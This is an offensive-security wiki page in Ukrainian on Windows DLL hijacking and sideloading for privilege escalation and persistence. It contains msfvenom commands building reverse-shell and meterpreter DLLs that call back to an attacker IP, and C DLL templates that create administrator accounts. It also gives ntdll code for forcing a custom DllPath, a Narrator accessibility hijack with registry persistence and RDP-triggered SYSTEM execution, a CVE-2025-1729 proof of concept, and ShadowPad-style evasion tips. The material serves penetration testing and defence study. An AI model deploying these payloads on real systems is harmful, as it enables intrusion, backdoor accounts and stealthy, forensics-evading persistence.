# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає в маніпуляції довіреним додатком з метою завантажити зловмисний DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Він головним чином використовується для code execution, досягнення persistence і, рідше, для privilege escalation. Незважаючи на фокус на escalation тут, метод перехоплення залишається послідовним для різних цілей.

### Поширені методи

Для DLL hijacking використовуються кілька підходів, кожен з яких ефективний залежно від стратегії завантаження DLL додатком:

1. **DLL Replacement**: Замінити справжній DLL на зловмисний, за бажанням використовуючи DLL Proxying для збереження функціональності оригінального DLL.
2. **DLL Search Order Hijacking**: Розміщення зловмисного DLL в шляху пошуку перед легітимним, експлуатуючи патерн пошуку додатку.
3. **Phantom DLL Hijacking**: Створення зловмисного DLL, який додаток завантажить, думаючи, що це відсутній потрібний DLL.
4. **DLL Redirection**: Зміна параметрів пошуку, таких як `%PATH%` або файли `.exe.manifest` / `.exe.local`, щоб спрямувати додаток до зловмисного DLL.
5. **WinSxS DLL Replacement**: Заміна легітимного DLL на зловмисний у директорії WinSxS, метод часто пов'язаний з DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення зловмисного DLL у директорії під контролем користувача разом із скопійованим додатком, нагадує Binary Proxy Execution techniques.

> [!TIP]
> Для покрокового ланцюга, що накладає HTML staging, AES-CTR configs та .NET implants поверх DLL sideloading, перегляньте робочий процес нижче.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх Dlls

Найпоширеніший спосіб знайти відсутні Dlls у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) з sysinternals, **встановивши** **наступні 2 фільтри**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

та показати лише **File System Activity**:

![](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні dlls загалом**, залиште це працювати протягом кількох **секунд**.\
Якщо ви шукаєте **відсутній dll всередині конкретного виконуваного файлу**, слід встановити **інший фільтр, наприклад "Process Name" "contains" `<exec name>`, виконати його, і зупинити захоплення подій**.

## Експлуатація відсутніх Dlls

Щоб здійснити privilege escalation, найкращий шанс — мати можливість записати dll, який процес з підвищеними привілеями намагатиметься завантажити, в одне з місць, де він буде шукатися. Отже, ми зможемо записати dll у папку, де цей dll шукається перед папкою з оригінальним dll (рідкісний випадок), або ми зможемо записати його в папку, де dll буде шукатися, а оригінального dll не існує в жодній папці.

### Dll Search Order

**У** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна знайти, як саме завантажуються Dlls.**

Windows applications шукають DLL, слідуючи набору заздалегідь визначених шляхів пошуку у певній послідовності. Проблема DLL hijacking виникає, коли шкідливий DLL стратегічно розміщено в одному з цих каталогів, що гарантує його завантаження перед автентичним DLL. Щоб цього уникнути, потрібно переконатися, що додаток використовує absolute paths при зверненні до потрібних DLL.

Нижче наведено **порядок пошуку DLL у 32-бітних** системах:

1. Каталог, з якого завантажено додаток.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. 16-бітний системний каталог. Немає функції для отримання шляху до цього каталогу, але він враховується при пошуку. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, вказані у змінній середовища PATH. Зауважте, що це не включає шлях per-application, вказаний ключем реєстру **App Paths**. Ключ **App Paths** не використовується при обчисленні шляху пошуку DLL.

Це **стандартний** порядок пошуку при увімкненому **SafeDllSearchMode**. Коли він вимкнений, поточний каталог піднімається на друге місце. Щоб вимкнути цю опцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням увімкнено).

Якщо функція [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликається з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в директорії виконуваного модуля, який завантажує **LoadLibraryEx**.

Нарешті, зауважте, що **dll може бути завантажений з вказівкою абсолютного шляху замість лише імені**. У такому випадку цей dll буде **шукатися тільки в цьому шляху** (якщо у dll є залежності, вони будуть шукатися як звичайно за іменем).

Існують інші способи змінити порядок пошуку, але я не буду описувати їх тут.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміновано вплинути на шлях пошуку DLL для новоствореного процесу — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою native API ntdll. Вказавши тут директорію під контролем нападника, цільовий процес, який резолює імпортований DLL за іменем (без абсолютного шляху і без використання прапорів безпечного завантаження), можна змусити завантажити зловмисний DLL з цієї директорії.

Ключова ідея
- Побудуйте параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть кастомний DllPath, який вказує на вашу контрольовану папку (наприклад, директорію, де живе ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий бінарний файл резолює DLL за іменем, loader звернеться до вказаного DllPath під час резолюції, що дозволяє надійне sideloading навіть коли зловмисний DLL не знаходиться поруч з цільовим EXE.

Примітки/обмеження
- Це впливає на створюваний дочірній процес; відрізняється від SetDllDirectory, що впливає лише на поточний процес.
- Ціль мусить імпортувати або викликати LoadLibrary для DLL за іменем (без абсолютного шляху і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs та захардкожені абсолютні шляхи не можна перехопити. Forwarded exports та SxS можуть змінювати пріоритет.

Мінімальний C-приклад (ntdll, wide strings, simplified error handling):

<details>
<summary>Повний C-приклад: примусове DLL sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Практичний приклад використання
- Помістіть шкідливий xmllite.dll (що експортує потрібні функції або проксить до справжнього) у ваш каталог DllPath.
- Запустіть підписаний бінарний файл, відомий тим, що шукає xmllite.dll за назвою, використовуючи описану вище техніку. Завантажувач вирішує імпорт через вказаний DllPath і sideloads ваш DLL.

Цю техніку спостерігали в реальних атаках для створення багатоступеневих sideloading-ланцюгів: початковий лаунчер скидає допоміжний DLL, який потім породжує Microsoft-signed, hijackable бінарний файл з кастомним DllPath, щоб примусово завантажити DLL нападника з проміжного каталогу.


#### Винятки в порядку пошуку dll за документацією Windows

У документації Windows зазначені певні винятки зі стандартного порядку пошуку DLL:

- Коли зустрічається **DLL, яка має ту ж назву, що й вже завантажена в пам'ять**, система обминає звичний пошук. Натомість вона виконує перевірку на redirection і manifest перед тим, як повернутися до DLL, яка вже знаходиться в пам'яті. **У цьому сценарії система не виконує традиційного пошуку DLL**.
- У випадках, коли DLL визнана **known DLL** для поточної версії Windows, система використовує свою версію цієї known DLL разом з будь-якими її залежними DLL, **відмовляючись від процесу пошуку**. Ключ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони були вказані тільки за **іменами модулів**, незалежно від того, чи була початкова DLL вказана повним шляхом.

### Escalating Privileges

**Requirements**:

- Визначте процес, який працює або буде працювати з **іншими привілеями** (horizontal або lateral movement), і якому **відсутній DLL**.
- Забезпечте наявність **права запису** для будь-якого **каталогу**, у якому буде **шукатися DLL**. Це місце може бути каталогом виконуваного файлу або директорією в системному path.

Так, вимоги складно знайти, адже **за замовчуванням досить дивно знайти привілейований виконуваний файл без DLL**, і ще **більш дивно мати права запису в папці системного шляху** (за замовчуванням цього не можна). Але в некоректно сконфігурованих середовищах це можливо.\
Якщо вам пощастило й ви відповідаєте вимогам, можете перевірити проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **головна мета проекту — bypass UAC**, ви можете знайти там PoC Dll hijacking для версії Windows, який можна використати (ймовірно, просто змінивши шлях до папки, у якій у вас є права запису).

Зауважте, що ви можете **перевірити свої дозволи в папці**, виконавши:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок у PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити імпорти виконуваного файлу та експорти dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного керівництва щодо того, як **зловживати Dll Hijacking, щоб підвищити привілеї** маючи дозволи на запис у **System Path folder** перегляньте:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) перевірить, чи маєте ви права запису в будь-яку папку всередині системного PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — це **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Приклад

Якщо ви знайдете експлуатований сценарій, однією з найважливіших речей для успішної експлуатації буде **створити dll, який експортує принаймні всі функції, які виконуваний файл імпортуватиме з нього**. Також зауважте, що Dll Hijacking зручно використовувати для [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Ви можете знайти приклад **як створити валідний dll** у цьому дослідженні dll hijacking, сфокусованому на dll hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Більше того, у **наступному розділі** ви можете знайти деякі **базові dll-коди**, які можуть бути корисними як **шаблони** або для створення **dll із експортованими необов'язковими функціями**.

## **Створення та компіляція Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатна **виконувати ваш шкідливий код при завантаженні**, але також **представляти** та **працювати** як очікується, **пересилаючи всі виклики до реальної бібліотеки**.

За допомогою інструменту [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви фактично можете **вказати виконуваний файл і вибрати бібліотеку**, яку хочете проксувати, і **згенерувати proxified dll**, або **вказати Dll** і **згенерувати proxified dll**.

### **Meterpreter**

**Отримати rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 я не бачив версії для x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в кількох випадках Dll, яку ви компілюєте, повинна **export several functions**, які будуть завантажені процесом-жертвою; якщо ці функції не існують, **binary won't be able to load** їх і **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL приклад зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна C DLL з точкою входу потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Кейс: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe досі звертається при запуску до передбачуваної, мовно-специфічної localization DLL, яку можна hijack для arbitrary code execution та persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо у шляху OneCore існує записувана DLL, контрольована зловмисником, вона завантажується і виконується `DllMain(DLL_PROCESS_ATTACH)`. Експорти не потрібні.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC — безшумність
- Примітивний hijack спричинить відтворення звуку/підсвічування UI. Щоб залишатися безшумним, під час приєднання перераховуйте потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і застосуйте до нього `SuspendThread`; продовжуйте у власному потоці. Див. PoC для повного коду.

Trigger and persistence via Accessibility configuration
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Завдяки наведеному, при запуску Narrator завантажується підкладений DLL. На secure desktop (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Дозвольте класичний RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться по RDP до хоста, на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваш DLL виконається як SYSTEM на secure desktop.
- Виконання припиняється, коли RDP-сесія закривається — виконуйте інжекцію/міграцію оперативно.

Bring Your Own Accessibility (BYOA)
- Ви можете клонувати вбудований запис реєстру Accessibility Tool (AT) (наприклад, CursorIndicator), відредагувати його так, щоб він вказував на довільний binary/DLL, імпортувати його, а потім встановити `configuration` на цю назву AT. Це дозволяє проксувати довільне виконання в рамках Accessibility framework.

Notes
- Запис у `%windir%\System32` та зміна значень HKLM вимагають прав адміністратора.
- Вся логіка payload може знаходитися в `DLL_PROCESS_ATTACH`; експорти не потрібні.

## Кейс: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Цей кейс демонструє **Phantom DLL Hijacking** у Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), відстежене як **CVE-2025-1729**.

### Деталі вразливості

- **Компонент**: `TPQMAssistant.exe`, розташований за `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` виконується щодня о 9:30 AM під контекстом залогіненого користувача.
- **Directory Permissions**: Доступний для запису `CREATOR OWNER`, що дозволяє локальним користувачам розміщувати довільні файли.
- **DLL Search Behavior**: Першочергово намагається завантажити `hostfxr.dll` з робочого каталогу і логить "NAME NOT FOUND", якщо відсутній, що вказує на пріоритет пошуку в локальному каталозі.

### Реалізація експлойта

Атакуючий може помістити шкідливий заглушковий `hostfxr.dll` у той самий каталог, експлуатуючи відсутність DLL для досягнення виконання коду в контексті користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Послідовність атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Очікуйте виконання планової задачі о 9:30 під контекстом поточного користувача.
3. Якщо адміністратор увійшов у систему під час виконання задачі, шкідливий DLL запускається в сесії адміністратора з рівнем цілісності medium.
4. Застосуйте стандартні техніки обходу UAC, щоб підняти привілеї з medium integrity до SYSTEM.

## Приклад: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Зловмисники часто поєднують MSI-based droppers з DLL side-loading для виконання payloads під довіреним, підписаним процесом.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Адміністративне витягнення: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичний sideloading з wsc_proxy.exe
- Помістіть ці два файли в одну папку:
- wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за іменем з його директорії.
- wsc.dll: DLL зловмисника. Якщо специфічні експорти не потрібні, DllMain достатній; в іншому випадку побудуйте proxy DLL і перенаправте потрібні експорти до оригінальної бібліотеки, запускаючи payload у DllMain.
- Побудуйте мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог експорту використовуйте proxying framework (e.g., DLLirant/Spartacus) для створення forwarding DLL, який також виконує ваш payload.

- Ця техніка покладається на розв'язання імен DLL хост-бінарою. Якщо хост використовує абсолютні шляхи або safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS, and forwarded exports можуть впливати на пріоритет і повинні враховуватися при виборі host binary та набору експорту.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point описали, як Ink Dragon розгортає ShadowPad, використовуючи **тріаду з трьох файлів**, щоб злитися з легітимним ПЗ, одночасно зберігаючи основний payload зашифрованим на диску:

1. **Signed host EXE** – постачальники такі як AMD, Realtek, або NVIDIA зловживаються (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Атакуючі перейменовують виконуваний файл, щоб він виглядав як Windows-бінар (наприклад `conhost.exe`), але підпис Authenticode залишається дійсним.
2. **Malicious loader DLL** – скидається поруч із EXE під очікуваним іменем (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC-бінарем, обфускованим за допомогою ScatterBrain; її єдине завдання — знайти зашифрований blob, розшифрувати його та reflectively map ShadowPad.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` в тій самій директорії. Після memory-mapping розшифрованого payload, loader видаляє TMP-файл, щоб знищити судові докази.

Tradecraft notes:

* Перейменування підписаного EXE (при збереженні оригінального `OriginalFileName` в PE header) дозволяє йому маскуватися як Windows-бінар, зберігаючи підпис вендора, тому відтворюйте звичку Ink Dragon скидати `conhost.exe`-подібні бінарні файли, які насправді є утилітами AMD/NVIDIA.
* Оскільки виконуваний файл залишається довіреним, більшості allowlisting-контролів достатньо, щоб ваш malicious DLL знаходився поруч із ним. Зосередьтеся на кастомізації loader DLL; підписаний батьківський файл зазвичай може працювати без змін.
* ShadowPad’s decryptor очікує, що TMP-blob буде знаходитися поруч із loader і бути доступним для запису, щоб він міг обнулити файл після mapping. Тримайте директорію доступною для запису, поки payload не завантажиться; як тільки він у пам'яті, TMP-файл можна безпечно видалити для OPSEC.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
